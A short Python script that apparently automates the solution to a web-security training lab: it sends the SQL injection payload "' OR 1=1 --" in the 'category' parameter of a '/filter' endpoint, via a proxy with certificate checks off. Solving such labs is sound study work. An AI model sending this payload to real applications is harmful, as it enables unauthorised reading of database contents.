from ..main import print_info, print_success
from urllib.parse import urlencode, urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/filter")
    params = {"category": "' OR 1=1 --"}
    print_info(
        f'Performing SQL injection attack by visiting "{url}?{urlencode(params)}"'
    )
    requests.get(
        url,
        params={"category": "' OR 1=1 --"},
        proxies=proxies,
        verify=False,
    )
    print_success("SQL injection attack performed.\n")
